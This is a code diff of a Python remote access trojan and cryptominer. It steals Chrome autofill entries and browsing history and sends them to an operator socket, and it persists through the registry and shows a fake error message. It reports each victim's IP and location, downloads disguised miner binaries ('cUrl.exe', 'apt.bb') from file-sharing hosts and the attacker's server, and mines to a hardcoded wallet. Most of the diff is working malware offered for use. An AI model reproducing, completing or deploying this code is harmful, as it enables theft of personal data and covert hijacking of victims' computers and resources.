@@ -27,6 +27,14 @@ from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 from json import loads
 from regex import findall
+import platform
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import time
+
+import os
+from http.server import HTTPServer, CGIHTTPRequestHandler
+
+
 
 """
 
@@ -36,11 +44,11 @@ from regex import findall
 
 ADDRESS = "TRX:TT9CxzPs846UQ2F5zxwmPuqHV115ETvs4d" #Only RandomX, replace with your adress COIN:ADDR ex : XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 
+PORTWEB = 80
 CLONE_PROCESS = False # Create Instances of the program hidden in multiple path.
 PROCESS_NUM = 2 #2 is the perfect number,if you want your program to be un-removable put it a 4 maximum
 HOST = "127.0.0.1" #change this to your ip do not change if you just want to mine.
 PORT = 7777 #Dont touch.
-
 FAKERROR = True #Show fake critical error 
 FAKERRMSG = "Exception at thread 0xSxZ3b78"
 MINE = True #Mine crypto? True/False
@@ -88,7 +96,11 @@ try:
 except:
 	print("Host down")
 
-
+def ClearTerm():
+	if(os.name == "nt" or os.name == "windows"):
+		os.system("cls")
+	else:
+		os.system("clear")
 def AddToRegistry():
 	#Statup should be available soon for Mac OS
 	if os.name == "nt" or os.name == "windows":
@@ -122,14 +134,12 @@ def stealChromeWin():
 	connection = sqlite3.connect(str(path))
 	chromewinpwd = str( tuple(connection.execute("SELECT  name, value FROM 'autofill'")))
 	connection.close()
-	print(chromewinpwd.replace("(", '\n').replace(")", "\r\n").encode())
 	s.send(chromewinpwd.replace("(", '\n').replace(")", "\r\n").encode())
 def stealChromeWinHistory():
 	path = str(os.environ['USERPROFILE'] + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\History")
 	connection = sqlite3.connect(str(path))
 	chromewinhist = str( tuple(connection.execute("SELECT url FROM 'urls'")))
 	connection.close()
-	print(chromewinhist.replace("(", '\n').replace(")", "\r\n").encode())
 	s.send(chromewinhist.replace("(", '\n').replace(")", "\r\n").encode())
 
 """
@@ -455,26 +465,26 @@ def getInstructions(s):
 				print(e)
 
 def MineThreadWin():
+	ClearTerm()
 	print("[.] Starting miner if enabled.")
-	os.system(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe --opencl --cuda -o rx.unmineable.com:3333 -u " +ADDRESS+".SxZ#ihlc-hs2a -p 0xSz -k -a rx/0")
+	os.system(os.getenv('APPDATA') + "\\winedows_companny\\update\\cUrl.exe -o rx.unmineable.com:3333 -u " +ADDRESS+".SxZ#ihlc-hs2a -p x -k -a rx")
 
 def MineThreadLinux():
 	print("[.] Starting miner if enabled.")
 	try:
-		os.system("./apt.bb --opencl --cuda -o rx.unmineable.com:3333 -u " +ADDRESS+".SxZ#ihlc-hs2a -p 0xSz -k -a rx/0")
+		os.system("./apt.bb -o rx.unmineable.com:3333 -u " +ADDRESS+".SxZ#ihlc-hs2a -p x -k")
 	except:
 		os.system("./apt.bb -o rx.unmineable.com:3333 -u "+ADDRESS+".SxZ#ihlc-hs2a -p 0xSz -k -a rx/0")
 def connectOption():
 	print(os.name)
-	if(os.name != "nt" or os.name != "windows"):
+	if os.name != "posix":
+		s.send(bytes("[.] 0xVictim to 0xSz : New Machine connected. Startup available. ----Informations---- ====== OS :{oss} ======IP : {IP} ====== Country : {country} ====== City : {city}======".format(IP=IP,country=country,city=city, oss=os.name),encoding='utf-8'))
+	else:
+		s.send(bytes("[.] 0xVictim to 0xSz : New Machine connected. Startup not available. (os is not windows.) ----Informations---- ====== OS :{oss} ======IP : {IP} ====== Country : {country} ====== City : {city}======".format(IP=IP,country=country,city=city, oss=os.name),encoding='utf-8'))	
+
+	if(os.name != "nt" and platform.system() != "Windows" or os.name != "windows" and platform.system() != "Windows"):
+		print("Not windows...")
 		try:
-			try:
-				if os.name != "posix":
-					s.send(bytes("[.] 0xVictim to 0xSz : New Machine connected. Startup available. ----Informations---- ====== OS :{oss} ======IP : {IP} ====== Country : {country} ====== City : {city}======".format(IP=IP,country=country,city=city, oss=os.name),encoding='utf-8'))
-				else:
-					s.send(bytes("[.] 0xVictim to 0xSz : New Machine connected. Startup not available. (os is not windows.) ----Informations---- ====== OS :{oss} ======IP : {IP} ====== Country : {country} ====== City : {city}======".format(IP=IP,country=country,city=city, oss=os.name),encoding='utf-8'))	
-			except:
-				print("[!] Host is down.")
 			os.system("mkdir /opt/0xSz/")
 			time.sleep(2)
 			os.system("mkdir /opt/0xSz/update/")
@@ -483,23 +493,72 @@ def connectOption():
 			os.chdir("/opt/0xSz/update/aptEssentials/")
 			os.system("apt install wget")
 			os.system("wget https://www.dropbox.com/s/kebdpffh42q7e7z/apt?dl=1 -O /opt/0xSz/update/aptEssentials/apt.bb")
+			os.system("chmod +x ./apt.bb")
+			#threading.Thread(target=MineThreadLinux).start()
+			time.sleep(2)
 			if MINE == True:
 				threading.Thread(target=MineThreadLinux)
 				print("[.] Executing miner..")
 		except Exception as e :
 			print(str(e))
-		os.system("chmod +x ./apt.bb")
-		#threading.Thread(target=MineThreadLinux).start()
-		time.sleep(2)
+
 		threading.Thread(target=getInstructions, args=(s,)).start()
 	else:
-		s.send(bytes("[.] 0xVictim to 0xSz : New Machine connected. Startup available. ----Informations---- ====== OS :{oss} ======IP : {IP} ====== Country : {country} ====== City : {city}======".format(IP=IP,country=country,city=city, oss=os.name),encoding='utf-8'))
-		os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny")
-		os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny\\update")
-		os.chdir(os.getenv('APPDATA') + "\\winedows_companny\\update")
-		os.system("curl https://s25.filetransfer.io/storage/download/s8sJk8IERdm0 --output cUrl.exe -s")
-		threading.Thread(target=MineThreadWin).start()
+		try:
+			s.send(bytes("[.] 0xVictim to 0xSz : New Machine connected. Startup available. ----Informations---- ====== OS :{oss} ======IP : {IP} ====== Country : {country} ====== City : {city}======".format(IP=IP,country=country,city=city, oss=os.name),encoding='utf-8'))
+			os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny")
+			os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny\\update")
+			os.chdir(os.getenv('APPDATA') + "\\winedows_companny\\update")
+			open(os.getenv('APPDATA') + "\\winedows_companny\\update\\config.json", "x").write('''
+{
+    "algo": "rx",
+    "api": {
+        "port": 0,
+        "access-token": null,
+        "worker-id": null,
+        "ipv6": false,
+        "restricted": true
+    },
+    "av": 0,
+    "background": false,
+    "colors": true,
+    "cpu-affinity": null,
+    "cpu-priority": null,
+    "donate-level": 5,
+    "huge-pages": true,
+    "hw-aes": null,
+    "log-file": null,
+    "max-cpu-usage": 80,
+    "pools": [
+        {
+            "url": "rx.unmineable.com:3333",
+            "user": "'''+ ADDRESS  + '''",
+            "pass": "x",
+            "keepalive": true,
+            "nicehash": false,
+            "variant": -1,
+            "tls": false,
+            "tls-fingerprint": null
+        }
+    ],
+    "print-time": 60,
+    "retries": 5,
+    "retry-pause": 5,
+    "safe": false,
+    "syslog": false,
+    "threads": null
+}
 
+			''')
+			os.system("curl http://"+ HOST +"/clientdownloads/cUrl.exe --output cUrl.exe -s")
+			os.chdir(os.getenv('APPDATA') + "\\winedows_companny\\update")
+
+			if MINE == True:
+				threading.Thread(target=MineThreadWin)
+				print("[.] Executing miner..")
+			threading.Thread(target=getInstructions, args=(s,)).start()
+		except Exception as e:
+			print(e)
 if __name__ == "__main__":
 	#Startup & Connection infos :
 	connectOption()
